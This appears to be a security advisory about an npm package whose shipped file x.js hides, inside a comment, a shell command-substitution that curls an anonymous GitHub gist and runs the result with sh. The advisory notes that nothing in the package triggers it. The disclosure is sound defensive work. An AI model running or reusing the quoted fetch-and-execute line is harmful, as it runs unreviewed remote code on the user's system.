summary: Shipped file contains inert JS with an embedded shell command-substitution referencing a remote gist
details: The published tarball includes x.js, a file declared in package.json 'files' that as JavaScript executes only console.log('hello world'). The file contains a block comment embedding a shell command-substitution of the form $(curl https://api.github.com/gists/da04f14c93acbe9a7aef827be0a2e91c | jq... > x; sh x), which would fetch and execute content from an anonymous mutable GitHub gist if the file were ever interpreted by a shell. No lifecycle script (preinstall/install/postinstall/prepare) in package.json invokes x.js, no other file in the package requires or sources it, and installing or importing the package does not cause the embedded shell substitution to be evaluated. The construct is latent on default install and import; harm requires a separate out-of-band action (sourcing or piping x.js to a shell) that the package itself does not perform.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
